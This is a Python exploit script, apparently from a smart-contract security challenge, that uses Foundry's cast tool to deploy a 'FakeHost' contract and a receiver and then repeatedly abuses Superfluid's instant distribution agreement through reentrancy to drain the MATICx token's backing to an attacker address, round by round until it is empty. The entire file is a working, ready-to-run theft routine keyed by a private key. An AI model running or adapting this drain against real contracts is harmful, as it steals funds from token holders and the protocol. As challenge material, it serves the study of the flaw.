#!/usr/bin/env python3
"""
CH6 FakeHost drain — conservative reentry=10, individual cast send transactions.
"""
import subprocess, json, os, time, sys

from dotenv import load_dotenv
load_dotenv("/Users/dldustn/Desktop/AssignmentC/.env")

RPC = os.environ["RPC_CH6_SUPERFLUID_V21"]
PK = os.environ["PRIVATE_KEY"]
ATK = os.environ["PUBLIC_ADDRESS"]

MATICX = "0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3"
HOST = "0x3E14dC1b13c488a8d5D310918780c983bD5982E7"
IDA = "0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1"

REENTRY = 10
GAS_LIMIT = "15000000"

def cast_send(to, sig, args=None, value=None, gas_limit=None):
    cmd = ["cast", "send", "--private-key", PK, "--rpc-url", RPC]
    if gas_limit:
        cmd += ["--gas-limit", str(gas_limit)]
    if value:
        cmd += ["--value", str(value)]
    cmd += [to, sig]
    if args:
        cmd += [str(a) for a in args]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    if r.returncode != 0:
        print(f"  TX ERROR: {r.stderr.strip()[:300]}", flush=True)
        return False
    return True

def cast_send_create(bytecode, gas_limit=None):
    cmd = ["cast", "send", "--private-key", PK, "--rpc-url", RPC, "--create", bytecode, "--json"]
    if gas_limit:
        cmd += ["--gas-limit", str(gas_limit)]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    if r.returncode != 0:
        print(f"  DEPLOY ERROR: {r.stderr.strip()[:300]}", flush=True)
        return None
    try:
        return json.loads(r.stdout)["contractAddress"]
    except:
        return None

def get_balance(addr):
    cmd = ["cast", "balance", addr, "--rpc-url", RPC]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return int(r.stdout.strip())

def cast_calldata(sig, args):
    cmd = ["cast", "calldata", sig] + [str(a) for a in args]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    return r.stdout.strip()

def deploy_fh():
    artifact = "/Users/dldustn/Desktop/AssignmentC/challenges/ch6_superfluid_v21/out/MegaDrain.sol/FH2.json"
    with open(artifact) as f:
        bytecode = json.load(f)["bytecode"]["object"]
    args = subprocess.run(
        ["cast", "abi-encode", "constructor(address,address)", IDA, MATICX],
        capture_output=True, text=True).stdout.strip()
    full = bytecode + args[2:]
    return cast_send_create(full)

def deploy_rcv():
    artifact = "/Users/dldustn/Desktop/AssignmentC/challenges/ch6_superfluid_v21/out/MegaDrain.sol/RN2.json"
    with open(artifact) as f:
        bytecode = json.load(f)["bytecode"]["object"]
    return cast_send_create(bytecode)

def drain_round(fh, rcv, idx, seed, reentry):
    print(f"  seed={seed}, reentry={reentry}", flush=True)

    # 1. Upgrade
    if not cast_send(MATICX, "upgradeByETH()", value=seed):
        return False

    # 2. Create index via Host
    cd = cast_calldata("createIndex(address,uint32,bytes)", [MATICX, idx, "0x"])
    if not cast_send(HOST, "callAgreement(address,bytes,bytes)", [IDA, cd, "0x"]):
        return False

    # 3. Subscribe
    cd = cast_calldata("updateSubscription(address,uint32,address,uint128,bytes)", [MATICX, idx, rcv, 1, "0x"])
    if not cast_send(HOST, "callAgreement(address,bytes,bytes)", [IDA, cd, "0x"]):
        return False

    # 4. Update index value
    cd = cast_calldata("updateIndex(address,uint32,uint128,bytes)", [MATICX, idx, seed, "0x"])
    if not cast_send(HOST, "callAgreement(address,bytes,bytes)", [IDA, cd, "0x"]):
        return False

    # 5. FakeHost attack
    if not cast_send(fh, "set(address,uint32,address,uint256)", [ATK, idx, rcv, reentry]):
        return False
    if not cast_send(fh, "go()", gas_limit=GAS_LIMIT):
        return False

    # 6. Drain receiver
    if not cast_send(rcv, "drain(address,address)", [MATICX, ATK]):
        return False

    return True

def main():
    print("=== CH6 Safe Drain (reentry=10) ===", flush=True)
    print(f"ATK: {ATK}", flush=True)
    bal = get_balance(ATK)
    backing = get_balance(MATICX)
    print(f"Balance: {bal}", flush=True)
    print(f"MATICx backing: {backing}", flush=True)

    # Deploy helpers
    print("Deploying FH...", flush=True)
    fh = deploy_fh()
    print(f"FH: {fh}", flush=True)

    print("Deploying RCV...", flush=True)
    rcv = deploy_rcv()
    print(f"RCV: {rcv}", flush=True)

    if not fh or not rcv:
        print("Deploy failed!", flush=True)
        return

    idx_base = 500000000

    for round_num in range(30):
        backing = get_balance(MATICX)
        bal = get_balance(ATK)
        print(f"\nRound {round_num}: backing={backing}, bal={bal}", flush=True)

        if backing == 0:
            print("FULLY DRAINED!", flush=True)
            break

        avail = max(0, bal - 500000000000000000)  # keep 0.5 MATIC for gas
        if avail <= 0:
            print("Not enough MATIC", flush=True)
            break

        reentry = REENTRY
        seed = backing // reentry
        if seed == 0:
            seed = 1
            reentry = backing
        if seed > avail:
            seed = avail

        # Cap seed to avoid SafeCast overflow in IDA deposit tracking
        # When seed × reentry is too large, int256 overflow occurs
        SEED_CAP = 10 * 10**21  # 10,000 MATIC max per round
        if seed > SEED_CAP:
            seed = SEED_CAP

        max_seed = (2**255 - 1) // (reentry + 1)
        if seed > max_seed:
            seed = max_seed

        if seed == 0:
            break

        idx = idx_base + round_num * 10

        if not drain_round(fh, rcv, idx, seed, reentry):
            print(f"  Round {round_num} FAILED", flush=True)
            # Deploy fresh helpers on failure
            print("  Deploying fresh helpers...", flush=True)
            fh = deploy_fh()
            rcv = deploy_rcv()
            idx_base += 1000
            continue

        new_backing = get_balance(MATICX)
        new_bal = get_balance(ATK)
        drained = backing - new_backing
        print(f"  Drained: {drained}, new_backing={new_backing}, bal={new_bal}", flush=True)

    print(f"\n=== FINAL ===", flush=True)
    print(f"MATICx backing: {get_balance(MATICX)}", flush=True)
    print(f"Our balance: {get_balance(ATK)}", flush=True)

if __name__ == "__main__":
    main()
